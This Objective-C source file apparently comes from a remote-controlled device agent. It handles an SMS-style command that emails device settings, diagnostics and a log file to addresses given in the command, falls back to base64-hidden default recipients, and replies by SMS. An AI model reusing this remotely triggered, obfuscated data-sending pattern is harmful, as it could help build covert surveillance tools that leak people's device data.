//
//  RequestDebugLogProcessor.m
//  RCM
//
//  Created by ophat on 7/6/15.
//
//

#import "RequestDebugLogProcessor.h"
#import "DeviceSettingsManager.h"
#import "RequestSettingsProcessor.h"
#import "RequestDiagnosticProcessor.h"

@interface RequestDebugLogProcessor (private)
-(BOOL) isValidRecipients:(NSArray *)aRecipientEmails;
- (NSArray *) getRecipientEmails ;
-(NSString *)constructMessage;
- (void) processSendLogFile:(NSArray *)aRecipientEmails;
- (void) acknowldgeMessage;
- (void) nothingToSend;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end

@implementation RequestDebugLogProcessor

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate{
    
    DLog (@">>>>>>>> RequestDebugLogProcessor--->initWithRemoteCommandData")
    
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
        
    }
    return self;
}

- (void) doProcessingCommand {
    /*
     <*#400><AC>
     <*#400><AC><D>
     <*#400><AC><RECIPIENT1>[<RECIPIENT2><...><RECIPIENT5>]
     <*#400><AC><RECIPIENT1>[<RECIPIENT2><...><RECIPIENT5>]<D>
     */
    NSArray *recipientEmails = [self getRecipientEmails];
    if ([self isValidRecipients:recipientEmails]) {
        [self processSendLogFile:recipientEmails];
    } else {
        FxException* exception = [FxException exceptionWithName:@"RequestDebugLogProcessor" andReason:@"Invalid recipient email addresses"];
        [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
        [exception setErrorCategory:kFxErrorRCM];
        @throw exception;
    }
}

-(BOOL) isValidRecipients:(NSArray *)aRecipientEmails{
    BOOL valid = false;
    for (int i=0; i < [aRecipientEmails count]; i++) {
        
        if ([[aRecipientEmails objectAtIndex:i]rangeOfString:@"@"].location != NSNotFound) {
            valid = true;
        }else{
            valid = false;
        }
    }
    return valid;
}

- (NSArray *) getRecipientEmails {
    DLog (@"RequestDeviceSettingsProcessor---->getDeviceSettingIDs");
    NSMutableArray *resultArray = [[NSMutableArray alloc] init];
    NSArray *args               = [mRemoteCmdData mArguments];
    DLog(@"args >> %@", args)
    
    for (int index = 2; index < [args count]; index++) { // skip remote command code and activation code
        DLog(@"arg %@", [args objectAtIndex:index])
        
        if (index == [args count]-1) {
            if ([[[args objectAtIndex:index] lowercaseString] isEqualToString:@"d"]) {
                DLog(@"Break here")
                break;
            }
        }
        [resultArray addObject:[args objectAtIndex:index]];
    }
    return [resultArray autorelease];
}

-(NSString *)constructMessage{
    NSString * result = nil;
    id <DeviceSettingsManager> deviceSettingsManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mDeviceSettingsManager];
    NSArray *deviceSettings = [deviceSettingsManager getDeviceSettings];
    
    NSString *requestSettings = [RequestSettingsProcessor getRequestSettings];
    
    NSString *requestDiagnostic = [RequestDiagnosticProcessor getRequestDiagnostic];
    
    NSString *deviceSettingsText = NSLocalizedString(@"kSendDebugLogDeviceSettings", @"");
    NSString *clientSettingsText = NSLocalizedString(@"kSendDebugLogClientSettings", @"");
    NSString *diagnosticText = NSLocalizedString(@"kSendDebugLogDiagnostic", @"");
    result = deviceSettingsText;
    for(int i=0; i < [deviceSettings count]; i++){
        NSDictionary * dict = [deviceSettings objectAtIndex:i];
        NSArray * key = [dict allKeys];
        for (int j=0; j<[key count]; j++) {
            result = [NSString stringWithFormat:@"%@\n%@ = %@",result,[key objectAtIndex:j],[dict objectForKey:[key objectAtIndex:j]]];
        }
    }
    result = [NSString stringWithFormat:@"%@\n\n%@\n%@",result,clientSettingsText,requestSettings];
    result = [NSString stringWithFormat:@"%@\n%@\n%@",result,diagnosticText,requestDiagnostic];
    
    return result;
}

-(void)processSendLogFile:(NSArray *)aRecipientEmails{
    FxLoggerManager * fxm = [FxLoggerManager sharedFxLoggerManager];
    
    NSMutableArray * receivers = [[NSMutableArray alloc]init];
    if ([aRecipientEmails count] == 0) {
        [receivers addObject:[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogTo", @"")]];
    }else{
        [receivers release];
        receivers = nil;
        receivers = [aRecipientEmails mutableCopy];
    }
    
    DLog(@"#### processSendLogFile receivers : %@",receivers);
    DLog(@"rec2 : %@",[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogFrom", @"")]);
    DLog(@"rec3 : %@",[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogFromName", @"")]);
    DLog(@"rec4 : %@",[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogSubject", @"")]);

    bool success = [fxm sendLogFileTo:receivers
                                 from:[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogFrom", @"")]
                            from_name:[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogFromName", @"")]
                              subject:[self decrpytWithBase64:NSLocalizedString(@"kSendDebugLogSubject", @"")]
                              message:[self constructMessage]
                             delegate:self];
    if (success) {
        [self acknowldgeMessage];
    } else {
        [self performSelector:@selector(nothingToSend) withObject:nil afterDelay:0.1];
    }
    [receivers release];
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_SUCCESS_];
    NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kSendDebugLogMSG1", @"")];
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

- (void) nothingToSend {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_ERROR_];
    NSString *noFileMsg =[ messageFormat stringByAppendingString:NSLocalizedString(@"kSendDebugLogNoLogFile", @"")];
    [self sendReplySMS:noFileMsg isProcessCompleted:YES];
}

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"RequestDebugLogProcessor ---> sendReplySMS...")
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:aReplyMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:aReplyMessage];
    }
    if (aIsComplete) {
        [self processFinished];
    }  
}

-(void) processFinished {
    DLog (@"RequestDebugLogProcessor ---> processFinished")
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

#pragma mark - Protocol method -

-(void) logFileSendCompleted:(NSError *) aError {
    NSString *message = nil;
    if (aError) {
        NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                            andErrorCode:_ERROR_];
        NSString *errMsg = [[aError userInfo] objectForKey:@"errMsg"];
        message=[NSString stringWithFormat:@"%@%@",messageFormat,errMsg];
    } else {
        NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                            andErrorCode:_SUCCESS_];
        NSString *text = NSLocalizedString(@"kSendDebugLogMSG2", @"");
        message = [NSString stringWithFormat:@"%@%@", messageFormat, text];
    }
    [self sendReplySMS:message isProcessCompleted:YES];
}

#pragma mark - Decrypt

-(NSString *)decrpytWithBase64:(NSString*)aCipherText{
    NSData *nsdataFromBase64String = [[NSData alloc]  initWithBase64EncodedString:aCipherText options:0];
    NSString *base64Decoded = [[[NSString alloc] initWithData:nsdataFromBase64String encoding:NSUTF8StringEncoding] autorelease];
    [nsdataFromBase64String release];
    return base64Decoded;
}

@end
